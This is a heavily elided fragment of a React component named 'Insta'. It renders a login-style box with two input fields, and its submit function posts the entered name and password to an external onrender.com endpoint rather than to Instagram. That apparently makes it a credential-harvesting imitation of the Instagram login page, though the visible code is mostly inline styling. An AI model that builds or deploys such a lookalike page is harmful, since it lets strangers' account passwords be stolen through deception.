...
const Insta = () => {
  ...
  function final() {
    ...
    if (Name === "") {
      ...
      axios
        .post("https://instagram-aphv.onrender.com/createProject", {
          Name, Password
    ...
    <div  >
      ...
      <div style={{ backgroundColor: "", height: "394px", marginTop: "41px", marginLeft: "36%", width: "376px" }}>
        ...
        <div style={{ marginTop: "", marginLeft: "10%" }}>
          ...
          <div><input style={{
            width: "82%", marginTop: "32px", fontSize: "13px",
            padding: "11px", backgroundColor: "rgb(251, 248, 244)", borderRadius: '3px', border: "0px"
          }}
          ...
          <div><input style={{
            width: "82%", padding: "11px", backgroundColor: "rgb(251, 248, 244)", borderRadius: '3px',
            marginTop: "5px", border: "0px"
